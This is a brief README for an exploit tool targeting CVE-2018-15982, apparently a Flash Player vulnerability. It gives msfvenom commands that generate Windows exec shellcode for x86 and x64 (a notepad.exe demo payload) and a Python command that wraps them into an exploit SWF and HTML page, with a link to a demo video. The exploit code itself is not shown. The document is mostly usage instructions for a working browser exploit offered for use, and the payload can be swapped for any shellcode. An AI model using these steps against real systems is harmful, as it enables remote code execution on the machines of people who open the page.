# CVE-2018-15982_EXP

## Usage

```
msfvenom -p windows/exec cmd=notepad.exe -f raw > 86.bin
msfvenom -p windows/x64/exec cmd=notepad.exe -f raw > 64.bin
python CVE_2018_15982.py -i 86.bin -I 64.bin
```

output `exp.swf` and `index.html`。

## Demo

https://twitter.com/Evi1cg/status/1071284773169950721